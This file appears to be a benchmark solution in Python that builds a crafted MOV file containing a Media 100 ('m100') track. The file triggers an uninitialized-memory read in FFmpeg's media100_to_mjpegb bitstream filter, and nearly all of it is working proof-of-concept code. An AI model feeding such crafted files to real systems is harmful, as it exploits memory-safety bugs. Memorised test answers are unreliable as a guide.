import struct

class Solution:
    """
    Generates a Proof-of-Concept MOV file that triggers an uninitialized
    value read in FFmpeg's media100_to_mjpegb bitstream filter.
    """

    def _atom(self, atom_type: bytes, data: bytes) -> bytes:
        """
        Creates a QuickTime atom with a 32-bit big-endian size header.
        An atom consists of: size (4 bytes) + type (4 bytes) + data.
        """
        return struct.pack('>I', 8 + len(data)) + atom_type + data

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The PoC is a minimal MOV file containing a single video track encoded
        with the 'm100' (Media 100) codec. The track contains a single frame
        (packet) crafted to be processed by the vulnerable bitstream filter.

        The vulnerability exists because the filter allocates an output buffer
        with padding but fails to initialize the padding. When this buffer is
        processed downstream, the uninitialized padding bytes can be read.

        The MOV file is constructed manually, atom by atom, to be as small
        as possible while still being valid enough for FFmpeg's MOV demuxer
        to parse and pass the packet to the bitstream filter. We use a
        less common but valid `ftyp-mdat-moov` layout to simplify the
        calculation of the media data offset.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC MOV file.
        """
        
        # This is the malicious packet for the 'mdat' atom. It's a minimal
        # Media 100 frame header plus a 1-byte payload.
        # Header format: file_skip (4B), size (4B), id (2B)
        # - file_skip = 10: The header itself is 10 bytes, so the data starts right after.
        # - size = 1: A minimal payload to trigger processing.
        # - id = 0x10DC: The specific identifier for Media 100 frames.
        packet_data = b'\x00\x00\x00\x0a\x00\x00\x00\x01\x10\xdc\xff'
        
        # 1. ftyp (File Type) atom: Identifies the file as QuickTime.
        ftyp_data = b'qt  \x00\x00\x00\x00qt  '
        ftyp_atom = self._atom(b'ftyp', ftyp_data)

        # 2. mdat (Media Data) atom: Contains the actual sample data (our packet).
        mdat_atom = self._atom(b'mdat', packet_data)
        
        # The offset to our media data is at the end of the ftyp atom, plus 8 bytes
        # for the mdat atom's size and type header.
        mdat_offset = len(ftyp_atom) + 8

        # 3. moov (Movie) atom: A container for all metadata.
        
        # 3a. mvhd (Movie Header) atom
        mvhd_data = (
            b'\x00\x00\x00\x00' +      # version (0), flags (0)
            b'\x00' * 8 +              # creation & modification time
            b'\x00\x00\x03\xe8' +      # timescale (1000)
            b'\x00\x00\x00\x01' +      # duration (1) in timescale units
            b'\x00\x01\x00\x00' +      # preferred rate (1.0)
            b'\x01\x00' +              # preferred volume (1.0)
            b'\x00' * 10 +             # reserved
            b'\x00\x01\x00\x00' + b'\x00' * 12 + # identity matrix
            b'\x00\x01\x00\x00' + b'\x00' * 12 +
            b'\x40\x00\x00\x00' +
            b'\x00' * 24 +             # preview time, etc.
            b'\x00\x00\x00\x02'        # next track ID
        )
        mvhd_atom = self._atom(b'mvhd', mvhd_data)

        # 3b. trak (Track) atom
        # tkhd (Track Header)
        tkhd_data = (
            b'\x00\x00\x00\x01' +      # version(0), flags (track enabled)
            b'\x00' * 8 +              # creation & modification time
            b'\x00\x00\x00\x01' +      # track ID (1)
            b'\x00' * 4 +              # reserved
            b'\x00\x00\x00\x01' +      # duration (1)
            b'\x00' * 8 +              # reserved
            b'\x00\x00\x00\x00' +      # layer, alternate group
            b'\x01\x00\x00\x00' +      # volume, reserved
            b'\x00\x01\x00\x00' + b'\x00' * 12 + # identity matrix
            b'\x00\x01\x00\x00' + b'\x00' * 12 +
            b'\x40\x00\x00\x00' +
            b'\x00\x10\x00\x00' +      # width (16.0)
            b'\x00\x10\x00\x00'        # height (16.0)
        )
        tkhd_atom = self._atom(b'tkhd', tkhd_data)
        
        # mdia (Media) atom
        # mdhd (Media Header)
        mdhd_data = (
            b'\x00' * 4 +              # version, flags
            b'\x00' * 8 +              # creation & modification time
            b'\x00\x00\x03\xe8' +      # timescale (1000)
            b'\x00\x00\x00\x01' +      # duration (1)
            b'\x55\xc4\x00\x00'        # language (undetermined), quality
        )
        mdhd_atom = self._atom(b'mdhd', mdhd_data)
        
        # hdlr (Handler Reference)
        hdlr_data = (
            b'\x00' * 8 +              # version, flags, component type
            b'vide' +                 # component subtype for video
            b'\x00' * 12 +             # reserved
            b'\x0cVideoHandler'        # name (pascal string)
        )
        hdlr_atom = self._atom(b'hdlr', hdlr_data)
        
        # minf (Media Information) atom
        # vmhd (Video Media Header)
        vmhd_data = b'\x00\x00\x00\x01' + b'\x00' * 8
        vmhd_atom = self._atom(b'vmhd', vmhd_data)
        
        # dinf (Data Information) -> dref (Data Reference)
        dref_entry = self._atom(b'url ', b'\x00\x00\x00\x01') # self-contained
        dref_data = b'\x00'*4 + b'\x00\x00\x00\x01' + dref_entry
        dinf_atom = self._atom(b'dinf', self._atom(b'dref', dref_data))

        # stbl (Sample Table) atom - the heart of the track metadata
        # stsd (Sample Description)
        stsd_desc_data = (
            b'\x00'*6 + b'\x00\x01' +       # reserved, data ref index
            b'\x00\x00\x00\x00' +           # version, revision
            b'\x00'*12 +                    # vendor, temp/spat quality
            b'\x00\x10\x00\x10' +           # width, height (16, 16)
            b'\x00\x48\x00\x00'*2 +         # horiz/vert resolution (72 dpi)
            b'\x00'*4 + b'\x00\x01' +       # data size, frame count
            b'\x04m100' + b'\x00'*27 +      # compressor name (pascal string "m100")
            b'\x00\x18\xff\xff'             # depth, color table id
        )
        stsd_m100_atom = self._atom(b'm100', stsd_desc_data)
        stsd_data = b'\x00'*4 + b'\x00\x00\x00\x01' + stsd_m100_atom
        stsd_atom = self._atom(b'stsd', stsd_data)
        
        # stts (Time to Sample): 1 sample with duration 1
        stts_data = b'\x00'*4 + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01'
        stts_atom = self._atom(b'stts', stts_data)
        
        # stsc (Sample to Chunk): 1 chunk with 1 sample
        stsc_data = b'\x00'*4 + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01'*3
        stsc_atom = self._atom(b'stsc', stsc_data)
        
        # stsz (Sample Size): points to our single sample of size len(packet_data)
        stsz_data = b'\x00'*8 + b'\x00\x00\x00\x01' + struct.pack('>I', len(packet_data))
        stsz_atom = self._atom(b'stsz', stsz_data)
        
        # stco (Chunk Offset): points to the location of the sample data
        stco_data = b'\x00'*4 + b'\x00\x00\x00\x01' + struct.pack('>I', mdat_offset)
        stco_atom = self._atom(b'stco', stco_data)
        
        # Assemble the nested atoms
        stbl_content = stsd_atom + stts_atom + stsc_atom + stsz_atom + stco_atom
        stbl_atom = self._atom(b'stbl', stbl_content)
        
        minf_content = vmhd_atom + dinf_atom + stbl_atom
        minf_atom = self._atom(b'minf', minf_content)
        
        mdia_content = mdhd_atom + hdlr_atom + minf_atom
        mdia_atom = self._atom(b'mdia', mdia_content)
        
        trak_content = tkhd_atom + mdia_atom
        trak_atom = self._atom(b'trak', trak_content)
        
        moov_content = mvhd_atom + trak_atom
        moov_atom = self._atom(b'moov', moov_content)
        
        # Assemble the final MOV file
        return ftyp_atom + mdat_atom + moov_atom